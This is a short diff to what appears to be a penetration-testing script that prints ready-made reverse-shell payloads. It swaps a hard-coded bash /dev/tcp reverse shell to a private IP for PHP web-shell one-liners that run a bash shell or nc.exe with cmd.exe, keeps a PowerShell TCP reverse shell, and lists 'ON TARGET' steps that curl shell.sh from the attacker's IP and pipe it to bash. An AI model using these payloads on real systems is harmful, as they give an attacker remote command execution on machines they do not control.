@@ -22,7 +22,9 @@ ps_shell="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stre
 
 # Cradles
 echo -e "\n<== Web ==>\n"
-echo -e "echo '/bin/sh -i >& /dev/tcp/192.168.45.221/9001 0>&1' > shell.sh\n"
+echo -e "<?php exec(\"$bash_shell\");?>\n"
+echo -e "<?php exec(\"C:\\ProgramData\\System\\\\nc.exe $ip $port -e cmd.exe\");?>\n"
+echo -e "echo '$bash_shell' > shell.sh\n"
 echo -e "ON TARGET: curl <OUR_IP>/shell.sh | /bin/bash\n"
 echo "ON TARGET: curl <OUR_IP>/shell.sh -o /tmp/shell.sh"
 echo "ON TARGET: /bin/bash /tmp/shell.sh"
